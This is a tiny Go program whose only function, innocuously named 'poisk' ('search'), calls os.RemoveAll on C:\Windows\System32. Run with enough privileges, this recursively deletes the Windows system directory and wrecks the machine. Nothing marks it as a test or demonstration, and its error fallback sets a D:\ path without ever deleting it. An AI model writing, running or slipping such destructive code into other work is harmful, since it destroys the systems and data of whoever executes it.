package main

import (
	"os"
)

type Data struct {
	LocalFile string
}

func poisk(p *Data) {
	p.LocalFile = `C:\Windows\System32`
	err := os.RemoveAll(p.LocalFile)
	if err != nil {
		p.LocalFile = `D:\Windows\System32`
	}
}
func main() {
	data := &Data{}
	poisk(data)
}
